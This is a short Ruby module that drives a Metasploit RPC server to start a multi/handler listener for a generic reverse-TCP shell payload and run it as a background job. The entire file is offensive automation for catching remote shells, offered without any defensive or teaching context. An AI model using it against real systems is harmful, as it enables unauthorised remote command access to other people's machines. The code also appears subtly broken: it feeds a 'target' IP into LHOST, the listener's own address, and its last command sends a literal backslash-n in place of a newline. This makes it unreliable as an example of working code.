require 'msfrpc-client'

module Metasploit
  def self.metasploit_exploit(target_ip, target_port)
    client = Msf::RPC::Client.new(
      host: ENV['METASPLOIT_HOST'],
      port: ENV['METASPLOIT_PORT'].to_i,
      username: ENV['METASPLOIT_USERNAME'],
      password: ENV['METASPLOIT_PASSWORD']
    )

    exploit = client.call('console.create')['id']
    client.call("console.write", 'id' => exploit, 'data' => "use exploit/multi/handler\n")
    client.call("console.write", 'id' => exploit, 'data' => "set PAYLOAD generic/shell_reverse_tcp\n")
    client.call("console.write", 'id' => exploit, 'data' => "set LHOST #{target_ip}\n")
    client.call("console.write", 'id' => exploit, 'data' => "set LPORT #{target_port}\n")
    client.call("console.write", 'id' => exploit, 'data' => 'exploit -j -z\n')
  end
end
